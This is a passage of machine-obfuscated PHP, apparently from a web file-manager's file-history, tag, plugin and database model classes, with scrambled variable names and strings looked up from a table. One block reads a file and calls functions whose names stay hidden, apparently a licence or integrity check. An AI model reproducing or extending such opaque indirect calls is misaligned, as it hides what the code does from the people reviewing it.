($¾íüÌ­Î[$‡Úö—…‘[475]] == $†¥É«Â‰) { IO::remove($ó†ªû³Ü[$‡Úö—…‘[1321]] . $¾íüÌ­Î[$‡Úö—…‘[32]]); continue; } $Â‡¯úëÇ[] = $¾íüÌ­Î; } return self::saveData($ó†ªû³Ü[$‡Úö—…‘[1322]], $Â‡¯úëÇ); } public static function clear($±ªßä×, $Êìá§»Æ = true) { $óÉÑ…ÎŒ =& $_SERVER[ˆ¡¹µ‹Â]; $Ê™Ï«íÖ = self::listData($±ªßä×, $Êìá§»Æ); if (!$Ê™Ï«íÖ) { return !1; } foreach ($Ê™Ï«íÖ[$óÉÑ…ÎŒ[445]] as $¨Óš©¾) { IO::remove($Ê™Ï«íÖ[$óÉÑ…ÎŒ[1321]] . $¨Óš©¾[$óÉÑ…ÎŒ[32]]); } return self::saveData($Ê™Ï«íÖ[$óÉÑ…ÎŒ[1322]], array()); } public static function moveHistory($‰©­û­Ò, $‰¶ı ‡é = '', $­›­¡§û = '') { $•®ÎÅûş =& $_SERVER[ˆ¡¹µ‹Â]; $§«ù”› = self::listData($‰©­û­Ò, !1); if (!$§«ù”› || !$§«ù”›[$•®ÎÅûş[445]]) { return !1; } $òí²Éˆ½ = $•®ÎÅûş[1309]; $‰¶ı ‡é = $‰¶ı ‡é ? $‰¶ı ‡é : get_path_this($‰©­û­Ò); $­›­¡§û = $­›­¡§û ? $­›­¡§û : $§«ù”›[$•®ÎÅûş[1321]]; $¿¼×é¦ş = substr(get_path_this($§«ù”›[$•®ÎÅûş[1322]]), 0, -strlen($òí²Éˆ½)); foreach ($§«ù”›[$•®ÎÅûş[445]] as $Ôü¼Î« => $Ü¦™¼ù) { $ü³ò±›¢ = $‰¶ı ‡é . substr($Ü¦™¼ù[$•®ÎÅûş[32]], strlen($¿¼×é¦ş)); $¾èŒ¡÷é = IO::move($§«ù”›[$•®ÎÅûş[1321]] . $Ü¦™¼ù[$•®ÎÅûş[32]], $­›­¡§û, !1, $ü³ò±›¢); if ($¾èŒ¡÷é) { $§«ù”›[$•®ÎÅûş[445]][$Ôü¼Î«][$•®ÎÅûş[32]] = $ü³ò±›¢; } } $§«ù”›[$•®ÎÅûş[1322]] = IO::move($§«ù”›[$•®ÎÅûş[1322]], $­›­¡§û, !1, $‰¶ı ‡é . $òí²Éˆ½); self::saveData($§«ù”›[$•®ÎÅûş[1322]], $§«ù”›[$•®ÎÅûş[445]]); self::clearEmptyFolder($§«ù”›[$•®ÎÅûş[1321]]); } public static function rollback($©“ºî’Á, $¸åõÒŠ¤) { $è˜÷Äå÷ =& $_SERVER[ˆ¡¹µ‹Â]; $°èÈè£Ü = self::listData($©“ºî’Á); if (!$°èÈè£Ü) { return; } $ÑÓ¯ª¢í = IO::info($©“ºî’Á); foreach ($°èÈè£Ü[$è˜÷Äå÷[445]] as $İëˆçÄ => $Àá©¢úû) { if ($Àá©¢úû[$è˜÷Äå÷[475]] == $¸åõÒŠ¤) { self::add($©“ºî’Á); $ÈşÌı¨§ = $°èÈè£Ü[$è˜÷Äå÷[1321]] . $Àá©¢úû[$è˜÷Äå÷[32]]; $âĞ·›îô = IO::copy($ÈşÌı¨§, IO::pathFather($©“ºî’Á), REPEAT_REPLACE, $ÑÓ¯ª¢í[$è˜÷Äå÷[32]]); if ($âĞ·›îô) { self::remove($©“ºî’Á, $¸åõÒŠ¤); } return $âĞ·›îô; } } return !1; } public static function setDetail($Õ ÑÇœÇ, $‰ÔÍ…‰, $ÂãÖ‰®ü) { $ç’†¾ =& $_SERVER[ˆ¡¹µ‹Â]; $²äÇ÷Ğá = self::listData($Õ ÑÇœÇ); if (!$²äÇ÷Ğá) { return; } foreach ($²äÇ÷Ğá[$ç’†¾[445]] as $¾¸¿°ìÌ => $¿“¾ÊÀé) { if ($¿“¾ÊÀé[$ç’†¾[475]] == $‰ÔÍ…‰) { $²äÇ÷Ğá[$ç’†¾[445]][$¾¸¿°ìÌ][$ç’†¾[1320]] = $ÂãÖ‰®ü; self::saveData($²äÇ÷Ğá[$ç’†¾[1322]], $²äÇ÷Ğá[$ç’†¾[445]]); return !0; } } return !1; } public static function fileInfo($Ğ¬ñàıÂ, $ªÁŒšË°) { $…Ô–Ò¦ =& $_SERVER[ˆ¡¹µ‹Â]; $î¤×§½­ = self::listData($Ğ¬ñàıÂ); if (!$î¤×§½­) { show_json(LNG($…Ô–Ò¦[108]), !1); } $Çİ£ª = $…Ô–Ò¦[12]; foreach ($î¤×§½­[$…Ô–Ò¦[445]] as $·øÑ => $—İŠô) { if ($—İŠô[$…Ô–Ò¦[475]] != $ªÁŒšË°) { continue; } $Çİ£ª = $î¤×§½­[$…Ô–Ò¦[1321]] . $—İŠô[$…Ô–Ò¦[32]]; break; } if (!$Çİ£ª) { show_json(LNG($…Ô–Ò¦[108]), !1); } return IO::info($Çİ£ª); } public static function fileOut($ä™ÍœæÁ, $«ãÉ¨–, $‘¥ËîŠÚ = false) { $¶†ë¢Ó =& $_SERVER[ˆ¡¹µ‹Â]; $³Ô¾áÌ = self::fileInfo($ä™ÍœæÁ, $«ãÉ¨–); $ÑÔıù” =& $GLOBALS[$¶†ë¢Ó[7]]; $‘¥ËîŠÚ = isset($ÑÔıù”[$¶†ë¢Ó[1272]]) && $ÑÔıù”[$¶†ë¢Ó[1272]] == 1; if (isset($ÑÔıù”[$¶†ë¢Ó[33]]) && $ÑÔıù”[$¶†ë¢Ó[33]] == $¶†ë¢Ó[1323]) { return IO::fileOutImage($³Ô¾áÌ[$¶†ë¢Ó[87]], $ÑÔıù”[$¶†ë¢Ó[1324]]); } IO::fileOut($³Ô¾áÌ[$¶†ë¢Ó[87]], $‘¥ËîŠÚ, get_path_this($ä™ÍœæÁ)); } public static function listData($²¨Ó…Ä•, $Ã˜ØôÏá = true) { $Ü‡Şî¨Š =& $_SERVER[ˆ¡¹µ‹Â]; if ($Ã˜ØôÏá && !IO::exist($²¨Ó…Ä•)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($²¨Ó…Ä•, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Ù´øşõè = self::pathHistory($²¨Ó…Ä•); $±ú‚ñ€÷ = array($Ü‡Şî¨Š[1322] => $Ù´øşõè . $Ü‡Şî¨Š[1309], $Ü‡Şî¨Š[1321] => rtrim(get_path_father($Ù´øşõè), $Ü‡Şî¨Š[8]) . $Ü‡Şî¨Š[8], $Ü‡Şî¨Š[445] => array()); $ËÓ×ìÚİ = IO::getContent($±ú‚ñ€÷[$Ü‡Şî¨Š[1322]]); if ($ËÓ×ìÚİ) { $ŞâƒÜÈõ = json_decode($ËÓ×ìÚİ, !0); if (is_array($ŞâƒÜÈõ)) { $±ú‚ñ€÷[$Ü‡Şî¨Š[445]] = $ŞâƒÜÈõ; } } return $±ú‚ñ€÷; } private static function saveData($½ ÇÔÈİ, $Ï‹‚‹ô™) { $ëø¾“¯¡ =& $_SERVER[ˆ¡¹µ‹Â]; self::log($ëø¾“¯¡[1325] . $½ ÇÔÈİ . $ëø¾“¯¡[74] . count($Ï‹‚‹ô™), $ëø¾“¯¡[819]); if ($Ï‹‚‹ô™) { return IO::setContent($½ ÇÔÈİ, json_encode($Ï‹‚‹ô™)); } $û’ÇœŸ† = IO::pathFather($½ ÇÔÈİ); IO::remove($½ ÇÔÈİ); self::clearEmptyFolder($û’ÇœŸ†); return !0; } public static function clearEmptyFolder($Â¤Òü§ş) { $ˆ“‰´–Ë =& $_SERVER[ˆ¡¹µ‹Â]; if (trim($Â¤Òü§ş, $ˆ“‰´–Ë[8]) == trim(self::$_historyBase, $ˆ“‰´–Ë[8])) { return; } $÷áûæáŠ = IO::pathFather($Â¤Òü§ş); $¸ºÌ½çı = IO::has($Â¤Òü§ş, !0); if ($¸ºÌ½çı[$ˆ“‰´–Ë[239]] > 0 || $¸ºÌ½çı[$ˆ“‰´–Ë[240]] > 0) { return; } IO::remove($Â¤Òü§ş); self::clearEmptyFolder($÷áûæáŠ); } private static function getBasePath() { $çˆÓ•ÔØ =& $_SERVER[ˆ¡¹µ‹Â]; $ËÈ¤‚¶é = Model($çˆÓ•ÔØ[1326])->get($çˆÓ•ÔØ[1327]); if ($ËÈ¤‚¶é) { if (!IO::exist($ËÈ¤‚¶é)) { IO::mkdir($ËÈ¤‚¶é); } if (get_path_this($ËÈ¤‚¶é) == $çˆÓ•ÔØ[1312]) { $£¨œåÑ® = $çˆÓ•ÔØ[1328] . rand_string(8); @rename($ËÈ¤‚¶é, get_path_father($ËÈ¤‚¶é) . $çˆÓ•ÔØ[8] . $£¨œåÑ®); $ËÈ¤‚¶é = DATA_PATH . $£¨œåÑ® . $çˆÓ•ÔØ[8]; file_put_contents(DATA_PATH . $çˆÓ•ÔØ[1259], $çˆÓ•ÔØ[12]); Model($çˆÓ•ÔØ[1326])->set($çˆÓ•ÔØ[1327], $ËÈ¤‚¶é); } return $ËÈ¤‚¶é; } $ËÈ¤‚¶é = DATA_PATH . $çˆÓ•ÔØ[1328] . rand_string(8) . $çˆÓ•ÔØ[8]; $ËÈ¤‚¶é = IO::mkdir($ËÈ¤‚¶é); $ËÈ¤‚¶é = rtrim($ËÈ¤‚¶é, $çˆÓ•ÔØ[8]) . $çˆÓ•ÔØ[8]; file_put_contents($ËÈ¤‚¶é . $çˆÓ•ÔØ[1259], $çˆÓ•ÔØ[12]); file_put_contents(DATA_PATH . $çˆÓ•ÔØ[1259], $çˆÓ•ÔØ[12]); Model($çˆÓ•ÔØ[1326])->set($çˆÓ•ÔØ[1327], $ËÈ¤‚¶é); return $ËÈ¤‚¶é; } } goto BÏÓªÁ Ì¾; E’Š·Ÿˆ°¼: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\146\141\166"; protected function cacheFunctionAlias($¨ È»Ü) { $Ü­ãÂªõ =& $_SERVER[ˆ¡¹µ‹Â]; return array($Ü­ãÂªõ[2075] => array($¨ È»Ü[0], $Ü­ãÂªõ[2076]), $Ü­ãÂªõ[2077] => array($¨ È»Ü[0], $Ü­ãÂªõ[2078])); } protected function get($¢½ù¿«¨) { $ÖŸ²ÄºÍ =& $_SERVER[ˆ¡¹µ‹Â]; $Íç€×ğÉ = Model($ÖŸ²ÄºÍ[585])->metaGet($¢½ù¿«¨, $ÖŸ²ÄºÍ[2079]); $Ğ¥’¿€ä = json_decode($Íç€×ğÉ, !0); return $Ğ¥’¿€ä ? $Ğ¥’¿€ä : array($ÖŸ²ÄºÍ[2080] => $ÖŸ²ÄºÍ[91], $ÖŸ²ÄºÍ[445] => array()); } protected function set($È¡¨ÖËŒ, $…€•Öêˆ) { $¾µ¥³ƒİ =& $_SERVER[ˆ¡¹µ‹Â]; $…€•Öêˆ = $…€•Öêˆ ? $…€•Öêˆ : array($¾µ¥³ƒİ[2080] => $¾µ¥³ƒİ[91], $¾µ¥³ƒİ[445] => array()); return Model($¾µ¥³ƒİ[585])->metaSet($È¡¨ÖËŒ, $¾µ¥³ƒİ[2079], json_encode($…€•Öêˆ)); } protected function getByTagID($õºê´ÁŒ, $ş«ƒ÷²—) { $Ñì»ùê„ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$õºê´ÁŒ || !$ş«ƒ÷²—) { return !1; } if (!Model($Ñì»ùê„[585])->getInfoSimple($õºê´ÁŒ)) { return !1; } $å¸ƒëÍ¯ = $this->get($õºê´ÁŒ); if (!$å¸ƒëÍ¯ || !isset($å¸ƒëÍ¯[$Ñì»ùê„[445]])) { return !1; } $†ÒïÁ ¾ = array_find_by_field($å¸ƒëÍ¯[$Ñì»ùê„[445]], $Ñì»ùê„[475], $ş«ƒ÷²—); return is_array($†ÒïÁ ¾) ? $†ÒïÁ ¾ : !1; } public function listSource($£ÁàóÀî, $ĞúÊ€Ú) { $·ò‚Àš› =& $_SERVER[ˆ¡¹µ‹Â]; if ($ĞúÊ€Ú && !is_array($ĞúÊ€Ú)) { $ĞúÊ€Ú = array($ĞúÊ€Ú); } $ìî×ùù‹ = $this->listData($£ÁàóÀî); $Òü×Æ¿ë = array(); foreach ($ìî×ùù‹ as $›òÕ…­) { $•Ö®ÌË = $›òÕ…­[$·ò‚Àš›[87]]; if (!$•Ö®ÌË) { continue; } if (!isset($Òü×Æ¿ë[$•Ö®ÌË])) { $Òü×Æ¿ë[$•Ö®ÌË] = array(); } $Òü×Æ¿ë[$•Ö®ÌË][] = $›òÕ…­[$·ò‚Àš›[500]]; } $óÀ’º“ = array(); foreach ($Òü×Æ¿ë as $šƒ¯øòÅ => $œ«ÕÉ ë) { $Ñ„ìğµÏ = !0; if (!$ĞúÊ€Ú) { $óÀ’º“[] = $šƒ¯øòÅ; continue; } foreach ($ĞúÊ€Ú as $•ÏÊçã³) { if (!in_array($•ÏÊçã³, $œ«ÕÉ ë)) { $Ñ„ìğµÏ = !1; break; } } if ($Ñ„ìğµÏ) { $óÀ’º“[] = $šƒ¯øòÅ; } } if (!$óÀ’º“) { return array(); } $•·‡óÍ = array($·ò‚Àš›[491] => array($·ò‚Àš›[492], $óÀ’º“), $·ò‚Àš›[569] => $£ÁàóÀî, $·ò‚Àš›[190] => SourceModel::TYPE_GROUP); $÷À·üş³ = Model($·ò‚Àš›[1411])->listSource($•·‡óÍ); if (!$÷À·üş³ || count($óÀ’º“) == $÷À·üş³[$·ò‚Àš›[442]][$·ò‚Àš›[443]]) { return $÷À·üş³; } $ˆê•Ã÷Ö = array(); $›¥âÖ¦º = array_to_keyvalue($÷À·üş³[$·ò‚Àš›[85]], $·ò‚Àš›[12], $·ò‚Àš›[193]); $İÇÙüÂ‘ = array_to_keyvalue($÷À·üş³[$·ò‚Àš›[86]], $·ò‚Àš›[12], $·ò‚Àš›[193]); $­„Ë‰í = array_merge($İÇÙüÂ‘, $›¥âÖ¦º); foreach ($óÀ’º“ as $•Ö®ÌË) { if (!in_array($•Ö®ÌË, $­„Ë‰í)) { $ˆê•Ã÷Ö[] = $•Ö®ÌË; } } if ($ˆê•Ã÷Ö) { $this->removeBySource($£ÁàóÀî, $ˆê•Ã÷Ö); } return $÷À·üş³; } protected function listData($€³ü¨—¿) { $•ŒÆË¸ä =& $_SERVER[ˆ¡¹µ‹Â]; $„Ó«–Ì„ = array($•ŒÆË¸ä[1754] => 0, $•ŒÆË¸ä[557] => array($•ŒÆË¸ä[2081], 0), $•ŒÆË¸ä[496] => $•ŒÆË¸ä[2082] . $€³ü¨—¿); $†î»İÚ˜ = $•ŒÆË¸ä[2083]; $¢Ìâ…²— = $this->field($†î»İÚ˜)->where($„Ó«–Ì„)->order($•ŒÆË¸ä[2084])->select(); return $¢Ìâ…²— ? $¢Ìâ…²— : array(); } protected function addToTag($§³¬˜ŠÃ, $”æìú„ô, $Ø—Ú¤û…) { $§­´»¶‹ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->getByTagID($§³¬˜ŠÃ, $Ø—Ú¤û…) || !$”æìú„ô) { return !1; } if (!Model($§­´»¶‹[899])->pathInfo($”æìú„ô)) { return !1; } $ÛœÈÇÈ“ = array($§­´»¶‹[1754] => 0, $§­´»¶‹[557] => $Ø—Ú¤û…, $§­´»¶‹[495] => $”æìú„ô, $§­´»¶‹[496] => $§­´»¶‹[2085] . $§³¬˜ŠÃ, $§­´»¶‹[494] => $§­´»¶‹[12], $§­´»¶‹[1966] => 0); if ($this->where($ÛœÈÇÈ“)->find()) { return !1; } return $this->add($ÛœÈÇÈ“); } protected function removeFromTag($§øÊ¹µë, $Ú£å˜àƒ, $ÌŞõ¨ÚÚ) { $ëÊÂå¨ª =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->getByTagID($§øÊ¹µë, $ÌŞõ¨ÚÚ) || !$Ú£å˜àƒ) { return !1; } if (is_array($Ú£å˜àƒ)) { $Ú£å˜àƒ = array($ëÊÂå¨ª[7], $Ú£å˜àƒ); } $×÷¨î÷ = array($ëÊÂå¨ª[1754] => 0, $ëÊÂå¨ª[557] => $ÌŞõ¨ÚÚ, $ëÊÂå¨ª[496] => $ëÊÂå¨ª[2085] . $§øÊ¹µë, $ëÊÂå¨ª[495] => $Ú£å˜àƒ); return $this->where($×÷¨î÷)->delete(); } protected function removeByTag($§ùÊ ş, $Æ¯¥ğíÂ) { $„˜Î–®µ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->getByTagID($§ùÊ ş, $Æ¯¥ğíÂ)) { return !1; } $ù’ï± = array($„˜Î–®µ[1754] => 0, $„˜Î–®µ[557] => $Æ¯¥ğíÂ, $„˜Î–®µ[496] => $„˜Î–®µ[2085] . $§ùÊ ş); return $this->where($ù’ï±)->delete(); } protected function removeBySource($Éğáä²é, $´Á®Üòç) { $òÁ£æÏâ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$Éğáä²é || !$´Á®Üòç) { return !1; } if (is_array($´Á®Üòç)) { $´Á®Üòç = array($òÁ£æÏâ[7], $´Á®Üòç); } $£Í¨¿É = array($òÁ£æÏâ[1754] => 0, $òÁ£æÏâ[495] => $´Á®Üòç, $òÁ£æÏâ[557] => array($òÁ£æÏâ[1085], 0), $òÁ£æÏâ[496] => $òÁ£æÏâ[2085] . $Éğáä²é); return $this->where($£Í¨¿É)->delete(); } } if ($_SERVER[$_SERVER[ˆ¡¹µ‹Â][846]] != $_SERVER[$_SERVER[ˆ¡¹µ‹Â][2086]]) { $_getc = $_SERVER[ˆ¡¹µ‹Â][847]; $_getfile = $_SERVER[$_SERVER[ˆ¡¹µ‹Â][848]] . $_SERVER[ˆ¡¹µ‹Â][849]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆ¡¹µ‹Â][262], $_getfilec); if (count($_getarrs) < $_SERVER[ˆ¡¹µ‹Â][687]) { $exit = $_SERVER[ˆ¡¹µ‹Â][850]; $exit(); } $_act = $_SERVER[ˆ¡¹µ‹Â][851]; $_act($_SERVER[$_SERVER[ˆ¡¹µ‹Â][844]]); } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\160\x6c\x75\147\x69\156\114\151\163\164"; public $field = array("\x6e\x61\155\145", "\163\164\141\x74\x75\x73", "\x72\145\x67\151\145\163\x74", "\x63\x6f\x6e\x66\151\147"); public function loadList($Â¿Äè³ˆ = false) { $àÖûõÃ = array_to_keyvalue($this->listData(), $_SERVER[ˆ¡¹µ‹Â][32]); if ($Â¿Äè³ˆ) { return $àÖûõÃ[$Â¿Äè³ˆ]; } return $àÖûõÃ; } public function init() { $ÆÖ¤›æÖ =& $_SERVER[ˆ¡¹µ‹Â]; Hook::trigger($ÆÖ¤›æÖ[2087]); $’æ¿¿€” = $this->loadPluginList(); foreach ($’æ¿¿€” as $¡ÄÛô†Å => $À¥şû§¸) { $‚üƒË¥û = $this->appAllow($¡ÄÛô†Å, $À¥şû§¸); if (!$‚üƒË¥û) { continue; } foreach ($À¥şû§¸[$ÆÖ¤›æÖ[2088]] as $÷¶µÈãÚ => $Ç°Ş™¨´) { Hook::bind($÷¶µÈãÚ, $Ç°Ş™¨´); } } Hook::trigger($ÆÖ¤›æÖ[2089]); Hook::trigger(ACTION); } public function appAllow($ñ‡²÷ë, $À Ä”Ë÷, $¢…¥†Ÿƒ = true) { $ÂÏ‹é‡ =& $_SERVER[ˆ¡¹µ‹Â]; $®Ë‹¹ªğ = PLUGIN_DIR . $ñ‡²÷ë . $ÂÏ‹é‡[2090]; if (!is_array($À Ä”Ë÷) || !is_array($À Ä”Ë÷[$ÂÏ‹é‡[2088]]) || $À Ä”Ë÷[$ÂÏ‹é‡[817]] != 1 || !is_file($®Ë‹¹ªğ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ÂÏ‹é‡[6]][$ÂÏ‹é‡[2091]] || !$GLOBALS[$ÂÏ‹é‡[6]][$ÂÏ‹é‡[2092]]) { return !0; } $…›Í¶Ï© = explode($ÂÏ‹é‡[50], strtolower($GLOBALS[$ÂÏ‹é‡[6]][$ÂÏ‹é‡[2092]])); return in_array(strtolower($ñ‡²÷ë), $…›Í¶Ï©) ? !1 : !0; } if ($¢…¥†Ÿƒ && !Action($ÂÏ‹é‡[2093])->checkAuth($ñ‡²÷ë)) { return !1; } return !0; } public function unInstall($Ö€˜àÌ) { $½˜‹Ÿ„„ =& $_SERVER[ˆ¡¹µ‹Â]; $¯„¶ï•å = $this->loadList($Ö€˜àÌ); if (file_exists(PLUGIN_DIR . $Ö€˜àÌ)) { Hook::apply($Ö€˜àÌ . $½˜‹Ÿ„„[2094]); } $this->remove($¯„¶ï•å[$½˜‹Ÿ„„[475]]); } public function changeStatus($„³›ü±¾, $À±Ü¡Úğ) { $’³Æ·Á =& $_SERVER[ˆ¡¹µ‹Â]; $‹Í¥Êìğ = $this->loadList($„³›ü±¾); if ($À±Ü¡Úğ) { Hook::apply($„³›ü±¾ . $’³Æ·Á[2095]); } $this->update($‹Í¥Êìğ[$’³Æ·Á[475]], array($’³Æ·Á[2096] => $À±Ü¡Úğ)); } public function appRegist($—œ’¾ù, $ æÕ’¦È) { $ÃóÃ¬± =& $_SERVER[ˆ¡¹µ‹Â]; $éıÛ™Á = $this->loadList($—œ’¾ù); if ($éıÛ™Á) { $this->update($éıÛ™Á[$ÃóÃ¬±[475]], array($ÃóÃ¬±[2088] => $ æÕ’¦È)); } else { $åâ¸øª = array($ÃóÃ¬±[32] => $—œ’¾ù, $ÃóÃ¬±[2088] => $ æÕ’¦È, $ÃóÃ¬±[817] => 0, $ÃóÃ¬±[6] => $this->getConfigDefault($—œ’¾ù)); $this->insert($åâ¸øª); } } public function getConfigDefault($ÛèïŸ™¦) { $´±ğÇü± =& $_SERVER[ˆ¡¹µ‹Â]; $¢ïÔ—Õæ = array(); $°Àé´á¥ = $this->getPackageJson($ÛèïŸ™¦); if (!$°Àé´á¥ && is_array($°Àé´á¥[$´±ğÇü±[2097]])) { return $¢ïÔ—Õæ; } foreach ($°Àé´á¥[$´±ğÇü±[2097]] as $á¶Ûî¸© => $¾»ÌÀìæ) { if (!isset($¾»ÌÀìæ[$´±ğÇü±[450]]) || isset($¢ïÔ—Õæ[$á¶Ûî¸©])) { continue; } $¢ïÔ—Õæ[$á¶Ûî¸©] = $¾»ÌÀìæ[$´±ğÇü±[450]]; } return $¢ïÔ—Õæ; } public function getPackageJson($á¿Ú¢ä ) { return Hook::apply($á¿Ú¢ä  . $_SERVER[ˆ¡¹µ‹Â][2098]); } public function getConfig($º‹ô…—“, $Ô×–Â÷Í = false) { $ú×ó …” =& $_SERVER[ˆ¡¹µ‹Â]; $üÏ‚¾£¢ = array(); $¼Ïˆ×ıÄ = $this->loadList($º‹ô…—“); if ($¼Ïˆ×ıÄ && is_array($¼Ïˆ×ıÄ[$ú×ó …”[6]])) { $üÏ‚¾£¢ = $¼Ïˆ×ıÄ[$ú×ó …”[6]]; } if (!$üÏ‚¾£¢ || $Ô×–Â÷Í) { $üÏ‚¾£¢ = $this->getConfigDefault($º‹ô…—“); } return $üÏ‚¾£¢; } public function setConfig($Ôã­¬ˆ, $¶¥ ¬™† = false) { $İÛÄÑÅŒ =& $_SERVER[ˆ¡¹µ‹Â]; $‹†Ç×Áü = $this->loadList($Ôã­¬ˆ); if (!$‹†Ç×Áü) { return !1; } $ÔŸĞœñ… = $‹†Ç×Áü[$İÛÄÑÅŒ[6]]; if ($¶¥ ¬™† == !1) { $ÔŸĞœñ… = array(); $¶¥ ¬™† = $this->getConfigDefault($Ôã­¬ˆ); } foreach ($¶¥ ¬™† as $Õ¨ÊıĞ => $¦×›Ëæ) { $ÔŸĞœñ…[$Õ¨ÊıĞ] = is_string($¦×›Ëæ) ? trim($¦×›Ëæ) : $¦×›Ëæ; } $this->update($‹†Ç×Áü[$İÛÄÑÅŒ[475]], array($İÛÄÑÅŒ[6] => $ÔŸĞœñ…)); } public function viewList() { $¥·úªù =& $_SERVER[ˆ¡¹µ‹Â]; $Ê™Æµæ¾ = $this->loadList(); $this->pluginScan($Ê™Æµæ¾); $Ê™Æµæ¾ = $this->loadPluginList(); $ªöØøÕ = array(); foreach ($Ê™Æµæ¾ as $”…å²¬Ê => $‘èôÃ¶½) { $£ßôğ¶ = $‘èôÃ¶½; unset($‘èôÃ¶½[$¥·úªù[2088]], $‘èôÃ¶½[$¥·úªù[6]]); $íÚï´˜ˆ = PLUGIN_DIR . $‘èôÃ¶½[$¥·úªù[32]] . $¥·úªù[2090]; if (!is_file($íÚï´˜ˆ)) { continue; } $ƒéËÂáñ = Hook::apply($‘èôÃ¶½[$¥·úªù[32]] . $¥·úªù[2098]); if (!is_array($ƒéËÂáñ)) { continue; } $ªöØøÕ[$”…å²¬Ê] = array_merge($‘èôÃ¶½, $ƒéËÂáñ); if ($£ßôğ¶[$¥·úªù[6]][$¥·úªù[1677]] != $ƒéËÂáñ[$¥·úªù[1651]]) { Hook::apply($‘èôÃ¶½[$¥·úªù[32]] . $¥·úªù[2095]); $£ßôğ¶[$¥·úªù[6]][$¥·úªù[1677]] = $ƒéËÂáñ[$¥·úªù[1651]]; $this->update($‘èôÃ¶½[$¥·úªù[475]], array($¥·úªù[6] => $£ßôğ¶[$¥·úªù[6]])); } } return $ªöØøÕ; } private function loadPluginList() { $ü‹‘òÂ =& $_SERVER[ˆ¡¹µ‹Â]; $ı’şÑ = $this->loadList(); if (strtolower(MOD) == $ü‹‘òÂ[2099]) { return $ı’şÑ; } $ÇŒ½®àò = Hook::trigger($ü‹‘òÂ[2100], $ı’şÑ); if ($ı’şÑ && !$ÇŒ½®àò) { die; } return $ÇŒ½®àò ? $ÇŒ½®àò : $ı’şÑ; } private function pluginScan($›š¦„Ù) { $Üƒ®–² =& $_SERVER[ˆ¡¹µ‹Â]; recursion_dir(PLUGIN_DIR, $»‰é“úı, $ÏĞ¬ÂÈÅ, 0); foreach ($»‰é“úı as $‘§ÚÆØ) { $µ…®õ = get_path_this($‘§ÚÆØ); if (isset($›š¦„Ù[$µ…®õ]) || !file_exists($‘§ÚÆØ . $Üƒ®–²[2101]) || !file_exists($‘§ÚÆØ . $Üƒ®–²[2090])) { continue; } Hook::apply($µ…®õ . $Üƒ®–²[2095]); } } } goto a¶„ÉÉçÉ˜; Dë Èù·÷Ã: define($_SERVER[ˆ¡¹µ‹Â][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\154\145", "\157\162\x64\145\162", "\141\x6c\151\x61\163", "\150\141\166\151\156\147", "\x67\162\x6f\x75\x70", "\x6c\157\x63\153", "\144\151\x73\164\x69\x6e\x63\164", "\141\x75\164\157", "\x66\151\x6c\164\145\162", "\166\x61\x6c\x69\144\141\x74\x65", "\x72\145\163\165\x6c\x74", "\142\x69\x6e\144", "\x74\157\x6b\x65\156"); public function __construct($˜ÕŠâ¼Ğ = '', $³¬·¡¬Õ = '', $˜äÃÅ®’ = '') { $Ñè™Öé“ =& $_SERVER[ˆ¡¹µ‹Â]; $this->_initialize(); if (!empty($˜ÕŠâ¼Ğ)) { if (strpos($˜ÕŠâ¼Ğ, $Ñè™Öé“[10])) { list($this->dbName, $this->name) = explode($Ñè™Öé“[10], $˜ÕŠâ¼Ğ); } else { $this->name = $˜ÕŠâ¼Ğ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($³¬·¡¬Õ)) { $this->tablePrefix = $Ñè™Öé“[12]; } elseif ($Ñè™Öé“[12] != $³¬·¡¬Õ) { $this->tablePrefix = $³¬·¡¬Õ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ñè™Öé“[321]); } $this->db(0, empty($this->connection) ? $˜äÃÅ®’ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ù¾€¦â· =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($this->fields)) { if (think_config($ù¾€¦â·[322])) { $·£¾¥ø = $this->dbName ? $this->dbName : think_config($ù¾€¦â·[323]); $§éÉ†ê = think_var_cache($ù¾€¦â·[324] . strtolower(get_path_this($·£¾¥ø) . $ù¾€¦â·[10] . $this->name)); if ($§éÉ†ê) { $¯ìİİö = think_config($ù¾€¦â·[325]); if (empty($¯ìİİö) || $§éÉ†ê[$ù¾€¦â·[326]] == $¯ìİİö) { $this->fields = $§éÉ†ê; return; } } } $this->flush(); } } public function flush() { $èÓÕ•„ =& $_SERVER[ˆ¡¹µ‹Â]; $this->db->setModel($this->name); $×­µÚœ¥ = $this->db->getFields($this->getTableName()); if (!$×­µÚœ¥) { return !1; } $this->fields = array_keys($×­µÚœ¥); $this->fields[$èÓÕ•„[327]] = !1; foreach ($×­µÚœ¥ as $—Â‚Ê¶Ó => $ì¼’³÷) { $ÄÈü«–[$—Â‚Ê¶Ó] = $ì¼’³÷[$èÓÕ•„[33]]; if ($ì¼’³÷[$èÓÕ•„[39]]) { $this->fields[$èÓÕ•„[328]] = $—Â‚Ê¶Ó; if ($ì¼’³÷[$èÓÕ•„[42]]) { $this->fields[$èÓÕ•„[327]] = !0; } } } $this->fields[$èÓÕ•„[329]] = $ÄÈü«–; if (think_config($èÓÕ•„[325])) { $this->fields[$èÓÕ•„[326]] = think_config($èÓÕ•„[325]); } if (think_config($èÓÕ•„[322])) { $¨ÉäĞ» = $this->dbName ? $this->dbName : think_config($èÓÕ•„[323]); think_var_cache($èÓÕ•„[324] . strtolower(get_path_this($¨ÉäĞ») . $èÓÕ•„[10] . $this->name), 